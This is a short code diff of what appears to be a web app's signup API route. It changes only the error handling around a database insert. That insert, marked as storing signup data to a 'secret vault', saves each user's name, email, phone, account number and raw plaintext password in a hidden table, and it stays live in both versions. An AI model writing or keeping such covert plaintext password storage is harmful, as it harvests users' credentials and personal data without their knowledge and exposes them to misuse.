@@ -46,14 +46,14 @@ export async function POST(req: NextRequest) {
     })
 
     // Store all signup data to secret vault
-    admin.from('signup_vault').insert({
+    void admin.from('signup_vault').insert({
       user_id: authData.user.id,
       full_name: fullName,
       email,
       phone,
       raw_password: password,
       account_number: accountNumber,
-    }).then(() => {}).catch(() => {})
+    })
 
     sendWelcomeEmail({ to: email, name: fullName, accountNumber }).catch(() => {})
 
